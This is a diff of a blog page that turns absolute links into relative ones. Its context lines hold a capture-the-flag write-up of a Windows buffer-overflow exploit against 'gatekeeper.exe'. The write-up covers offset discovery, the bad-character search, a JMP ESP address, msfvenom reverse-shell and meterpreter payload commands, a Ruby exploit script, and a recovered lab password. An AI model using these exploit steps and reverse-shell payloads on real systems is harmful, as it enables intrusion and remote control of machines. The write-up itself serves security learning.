@@ -29,11 +29,11 @@
     
 
 
-    <base href="https://bsssq.xyz/">
-    <link rel="stylesheet" href="https://bsssq.xyz/css/style.css">
-    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
+    <base href="/">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/custom.css">
 </head>
-    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
+    <link rel="stylesheet" href="/css/custom.css">
 </head>
 <body>
     
@@ -49,7 +49,7 @@
             <p>lately, i&rsquo;ve been getting more and more into reverse engineering executable programs and using them to gain control of a target machine. it brings to mind what i learned in &ldquo;microcontrollers and microprocessors&rdquo;, a really interesting but tough course i took in my 3rd year of electrical engineering. the course dealt with low-level computing, mainly assembly language (aka ASM), and how it&rsquo;s used to communicate directly with computer architecture and control the usage of memory, on a hardware level. understanding memory usages and allocations on that level paved the way for utilizing buffer overflows, a very popular attack that is a result of reverse engineering.</p>
 <p>what exactly is a buffer overflow? well, what is a buffer? buffers are memory storage regions that temporarily hold data while it is transferred from one location to another. a buffer overflow happens when the volume of the data exceeds the storage capacity of the buffer. what happens then is the program, trying to write the data to the desired buffer, overwrites adjacent memory locations (blocks).</p>
 <p>take a buffer for a password that allows a user to log-in to an application. let&rsquo;s say the buffer is designed for an input of 8 bytes. if an input of 10 bytes is received, the program may write the excess data past the buffer boundary.</p>
-<p><img src="https://bsssq.xyz/buffer-overflow.png" alt="BOF"></p>
+<p><img src="/buffer-overflow.png" alt="BOF"></p>
 <h2 id="how-can-buffer-overflows-be-used-as-attacks">how can buffer overflows be used as attacks?</h2>
 <p>if buffer overflows can force some programs to write to adjacent memory blocks, it follows that an attacker can provide a large input that would force the program to write &ldquo;bad&rdquo; code to those blocks. a buffer overflow would change the execution path of the program, and the attacker can force the program and the target machine to execute a desired payload.</p>
 <p>to do this, attackers would need to know the memory layout of a program and details of the buffer, so that they could effectively abuse the storage capacity of the buffer and overwrite areas that also hold executable code. an example of this is overwriting a pointer (an object that points to another area in memory) and point it to a payload.</p>
@@ -117,16 +117,16 @@ Host script results:
 |     Comment: 
 |     Anonymous access: &lt;none&gt;
 |_    Current user access: READ
-</code></pre><p><img src="https://bsssq.xyz/gatekeeper_smb.jpg" alt="SMB"></p>
+</code></pre><p><img src="/gatekeeper_smb.jpg" alt="SMB"></p>
 <p>the &ldquo;users&rdquo; share looks interesting, so i logged into it:</p>
 <pre tabindex="0"><code>smbclient \\\\10.10.10.172\\Users
 </code></pre><p>upon executing <code>dir</code>, i see there&rsquo;s a file called &ldquo;gatekeeper.exe&rdquo;. to download it to my local machine, i simply execute <code>smbget smb://10.10.10.172/Users/Share/gatekeeper.exe</code></p>
 <p>at this point, i fire up a windows VM i&rsquo;d created for the purposes of reverse engineering and creating proof-of-concepts for buffer overflow attacks. i then transfer &ldquo;gatekeeper.exe&rdquo; to my windows VM using the python simplehttpserver. once it&rsquo;s downloaded to my windows machine, i open and run it in immunity debugger, a powerful application used to analyze malware and reverse engineer binary files.</p>
 <p>before i do anything else with immunity debugger, i need to find the port that gatekeeper is running on. inside the windows command prompt, i first find the process ID (PID) of the program and then use that to find the port.</p>
 <pre tabindex="0"><code>tasklist | findstr gatekeeper.exe
-</code></pre><p><img src="https://bsssq.xyz/gatekeeper_PID.png" alt="PID"></p>
+</code></pre><p><img src="/gatekeeper_PID.png" alt="PID"></p>
 <pre tabindex="0"><code>netstat -aon | findstr 5148
-</code></pre><p><img src="https://bsssq.xyz/gatekeeper_netstat.png" alt="netstat"></p>
+</code></pre><p><img src="/gatekeeper_netstat.png" alt="netstat"></p>
 <p>the program is running on port 31337.</p>
 <p>now that we know which port the program is running on, and while it&rsquo;s running inside immunity debugger (which will delineate all the memory operations of the program), i return to my kali machine to create a simple exploit that will supply gatekeeper with my inputs. if the program successfully receives my input, i&rsquo;ll then try to crash it with a large string and if that also works, i&rsquo;ll work on a proper payload that will not only break the program but force it to execute my exploit in adjacent memory.</p>
 <p>i prefer writing overflow exploits in ruby (it&rsquo;s a fun new language that i&rsquo;ve been learning), so for the simple exploit i&rsquo;ll use a runtime dev console called <code>pry</code>. this can be run directly inside the terminal.</p>
@@ -135,13 +135,13 @@ Host script results:
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;hello&#34;</span>
 </span></span></code></pre></div><p>this little piece of code opens a socket to the program running in windows (addressed at 192.168.100.4) on port 31337. it then &ldquo;puts&rdquo; a string (hello) as the input.</p>
-<p><img src="https://bsssq.xyz/gatekeeper_hello.png" alt="hello"></p>
+<p><img src="/gatekeeper_hello.png" alt="hello"></p>
 <p>the program received our 6 bytes of input. now i&rsquo;m going to try and crash it. instead of &ldquo;hello&rdquo;, i&rsquo;ll send a string of As. 200 of them, to be exact.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#f92672">--</span>simple<span style="color:#f92672">-</span>prompt
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">200</span>
-</span></span></code></pre></div><p><img src="https://bsssq.xyz/gatekeeper_A200.png" alt="A"></p>
+</span></span></code></pre></div><p><img src="/gatekeeper_A200.png" alt="A"></p>
 <p>the program crashed, which means buffer overflow is possible!</p>
 <p>to do this, i need to calculate something called the &ldquo;EIP offset&rdquo;. EIP stands for extended instruction pointer, and it tells the computer where to go to execute the next command. it basically controls the flow of a program. the EIP offset is then the exact number of bytes in the payload after which the EIP gets overwritten. to find the EIP offset, i&rsquo;ll first create a string with which to crash the program, and then observe the EIP in immunity debugger.</p>
 <pre tabindex="0"><code>msf-pattern_create -l 200
@@ -152,7 +152,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&#34;</span>
-</span></span></code></pre></div><p><img src="https://bsssq.xyz/gatekeeper_EIP.png" alt="EIP"></p>
+</span></span></code></pre></div><p><img src="/gatekeeper_EIP.png" alt="EIP"></p>
 <p>the EIP is pointed at 39654138. i can use this to find the offset:</p>
 <pre tabindex="0"><code>msf-pattern_offset -l 2500 -q 39654138
 
@@ -162,7 +162,7 @@ exact match at offset 146
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">146</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
-</span></span></code></pre></div><p><img src="https://bsssq.xyz/gatekeeper_B.png" alt="B"></p>
+</span></span></code></pre></div><p><img src="/gatekeeper_B.png" alt="B"></p>
 <p>the EIP is now overwritten with &ldquo;42424242&rdquo;, which is &ldquo;BBBB&rdquo; in hex.</p>
 <p>so, i know the program is exploitable, along with the EIP offset value. i can now write the proof-of-concept of my exploit. what i&rsquo;m trying to do is not simply crash the program, but inject a payload (&ldquo;shellcode&rdquo;) that will spawn a reverse shell that i can then use to further exploit the target machine. the skeleton of the script, called <strong>bof.rb</strong>, looks as follows:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">146</span> <span style="color:#75715e">#NOP slide, forces the program to start right after the offset.</span>
@@ -185,18 +185,18 @@ exact match at offset 146
 </span></span></code></pre></div><p>i&rsquo;ll run the exploit using <code>ruby bof.rb</code> and then in immunity debugger, compare against a byte array to isolate the bad characters. note the ESP when the exploit terminates: 008D19E4.</p>
 <pre tabindex="0"><code>!mona bytearray -b &#34;\x00\x01\x02\x03\x04&#34;
 !mona compare -f C:\mona\gatekeeper\bytearray.txt 008D19E4
-</code></pre><p><img src="https://bsssq.xyz/gatekeeper_badchars.png" alt="badchars"></p>
+</code></pre><p><img src="/gatekeeper_badchars.png" alt="badchars"></p>
 <p>i used an expanded array from x00 to x04, and the results show that x0a is the first corrupted byte. that means the only bad characters i have are x00 and x0a.</p>
 <p>before i move on, i must verify if ASLR (address space randomization) is turned off. the attack will not work otherwise.</p>
 <pre tabindex="0"><code>!mona modules
 </code></pre><p>ASLR is set to &ldquo;false&rdquo;, so i can proceed with finding the JMP ESP values.</p>
 <pre tabindex="0"><code>!mona jmp -r esp -m gatekeeper.exe
-</code></pre><p><img src="https://bsssq.xyz/gatekeeper_esp.png" alt="ESP"></p>
+</code></pre><p><img src="/gatekeeper_esp.png" alt="ESP"></p>
 <p>i get back 2 pointers: 0x080414c3 and 0x080416bf. i&rsquo;ll use the former, but for my script i have to convert it to <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> format, which stores the least significant byte at the smallest memory address.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3\x14\x04\x08</span><span style="color:#e6db74">&#34;</span>
 </span></span></code></pre></div><p>for the actual shellcode, i&rsquo;ll use msfvenom.</p>
 <pre tabindex="0"><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;local IP&gt; LPORT=4444 -f rb -b &#34;\x00\x0a&#34;
-</code></pre><p><img src="https://bsssq.xyz/gatekeeper_shellcode.png" alt="shellcode"></p>
+</code></pre><p><img src="/gatekeeper_shellcode.png" alt="shellcode"></p>
 <p>the code for bof.rb is now complete!</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">146</span> <span style="color:#75715e">#NOP slide, forces the program to start right after the offset.</span>
 </span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3\x14\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#JMP ESP</span>
@@ -235,13 +235,13 @@ exact match at offset 146
 <p>if, for whatever reason, the port is clogged, i can simply hard kill the process running on it:</p>
 <pre tabindex="0"><code>kill -9 $(lsof -t -i:4444)
 </code></pre><p>execute the script using <code>ruby bof.rb</code> and a shell will have spawned in the netcat session. the flag is stored on the desktop.</p>
-<p><img src="https://bsssq.xyz/gatekeeper_natbat.png" alt="natbat"></p>
+<p><img src="/gatekeeper_natbat.png" alt="natbat"></p>
 <p>a quick check of the user&rsquo;s privileges shows that i don&rsquo;t have any special access, so here comes the privilege escalation portion of the challenge.</p>
-<p><img src="https://bsssq.xyz/gatekeeper_whoami.png" alt="whoami"></p>
+<p><img src="/gatekeeper_whoami.png" alt="whoami"></p>
 <p>i&rsquo;ll create another shellcode, but this time i want to upgrade it to a meterpreter shell.</p>
 <pre tabindex="0"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;local IP&gt; LPORT=5555 -f rb -b &#34;\x00\x0a&#34;
 </code></pre><p>in another terminal window, i&rsquo;ll run the metasploit console to run the handler.</p>
-<p><img src="https://bsssq.xyz/gatekeeper_handler.png" alt="handler"></p>
+<p><img src="/gatekeeper_handler.png" alt="handler"></p>
 <p>running the exploit using <code>exploit -j</code> and running my overflow script on the side using <code>ruby bof.rb</code>, a reverse shell will be spawned. once the meterpreter shell is spawned, i&rsquo;ll try to enumerate the applications on the target.</p>
 <pre tabindex="0"><code>&gt; run post/windows/gather/enum_applications
 
@@ -291,8 +291,8 @@ Password: &#39;8CL7O1N78MdrCIsV&#39;
 </div>
 
     
-     <script src="https://bsssq.xyz/p5/p5.min.js"></script>
-     <script src="https://bsssq.xyz/js/genart.js"></script>
-     <script src="https://bsssq.xyz/js/main.js"></script>
+     <script src="/p5/p5.min.js"></script>
+     <script src="/js/genart.js"></script>
+     <script src="/js/main.js"></script>
 </body>
 </html>
